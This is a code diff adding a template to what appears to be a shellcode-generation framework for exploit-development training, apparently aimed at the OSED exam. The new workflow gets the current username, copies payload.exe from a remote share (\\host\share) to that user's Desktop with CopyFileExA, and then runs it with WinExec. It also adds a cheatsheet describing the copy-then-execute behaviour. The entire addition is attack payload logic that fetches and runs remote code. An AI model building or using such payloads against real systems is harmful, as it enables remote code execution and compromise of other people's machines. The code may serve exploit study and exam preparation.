@@ -1460,6 +1460,100 @@ class IRCopyToUserdirTemplate(WorkflowTemplate):
 
 
 # ---------------------------------------------------------------------------
+# Copy to user directory workflow (CopyFileExA variant)
+# ---------------------------------------------------------------------------
+
+
+def build_copy_to_userdir_ex_workflow(
+    src_path: str = r"\\host\share\payload.exe",
+    path_prefix: str = r"C:\Users" + "\\",
+    path_suffix: str = r"\Desktop\payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the copy_to_userdir_ex reference workflow.
+
+    GetUserNameA -> build dest path -> CopyFileExA(src, dest, NULL, NULL,
+    NULL, 0) -> WinExec(dest) -> exit
+
+    Identical to copy_to_userdir but uses CopyFileExA (6 arguments) instead
+    of CopyFileA (3 arguments), matching the OSED exam pattern.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    entry, build_path = _username_path_entry_blocks(path_prefix, path_suffix)
+    return Workflow(
+        name="ir_copy_to_userdir_ex",
+        blocks=(
+            entry,
+            build_path,
+            Block("use_path", (
+                ConstructString("src_path", src_path),
+                CallAPI(
+                    "CopyFileExA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        AddressOf("dest_path_buf"),
+                        Immediate(0),  # lpProgressRoutine = NULL
+                        Immediate(0),  # lpData = NULL
+                        Immediate(0),  # pbCancel = NULL
+                        Immediate(0),  # dwCopyFlags = 0
+                    ),
+                    result="copy_ret",
+                ),
+                Compare(
+                    "copy_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="run_payload",
+                    false_block="fail",
+                ),
+            )),
+            Block("run_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dest_path_buf"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare(
+                    "exec_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRCopyToUserdirExTemplate(WorkflowTemplate):
+    """IR-backed copy_to_userdir_ex template (CopyFileExA variant)."""
+
+    def __init__(self) -> None:
+        super().__init__(build_copy_to_userdir_ex_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_copy_to_userdir_ex_workflow(
+            src_path=config.src_path or r"\\host\share\payload.exe",
+            path_prefix=config.path_prefix or r"C:\Users" + "\\",
+            path_suffix=config.path_suffix or r"\Desktop\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        src = config.src_path or r"\\host\share\payload.exe"
+        prefix = config.path_prefix or r"C:\Users" + "\\"
+        suffix = config.path_suffix or r"\Desktop\payload.exe"
+        return [
+            ("Source path", src),
+            ("Destination pattern", f"{prefix}<username>{suffix}"),
+            ("Uses CopyFileExA (6 args)", ""),
+            ("Copies then executes destination", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
 # Move to user directory workflow
 # ---------------------------------------------------------------------------
 
